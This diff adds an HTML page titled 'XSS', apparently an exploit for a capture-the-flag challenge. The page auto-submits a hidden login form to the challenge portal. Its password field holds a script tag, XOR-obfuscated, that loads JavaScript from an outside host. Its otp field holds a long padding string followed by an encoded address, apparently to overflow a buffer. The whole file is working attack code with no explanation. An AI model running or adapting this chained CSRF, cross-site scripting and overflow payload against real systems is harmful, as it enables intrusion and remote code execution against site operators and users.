@@ -1,0 +1,29 @@
+<!doctype html>
+<html>
+  <head>
+    <title>
+      XSS
+    </title>
+  </head>
+  <body>
+      <form id="login_form" action="http://portal.essolutions.largestctf.com/login.php" method="POST">
+          <input type="hidden" name="username" id="username">
+          <input type="hidden" name="password" id="password">
+          <input type="hidden" name="otp" id="otp">
+      </form>
+      <script>
+        function frob(s) {
+            var result = "";
+            for (var i in s) {
+                result += String.fromCharCode(42 ^ s.charCodeAt(i));
+            }
+            return result;
+        }
+        document.getElementById("username").value = Array(17).join("A");
+        var payload = '<script\nsrc="http://rzhou.org/~ricky/__xss__.js"><' + '/script>';
+        document.getElementById("password").value = frob(payload);
+        document.getElementById("otp").value = Array(498).join("A") + unescape("%40%a0%04%08");
+        document.getElementById("login_form").submit();
+      </script>
+  </body>
+</html>
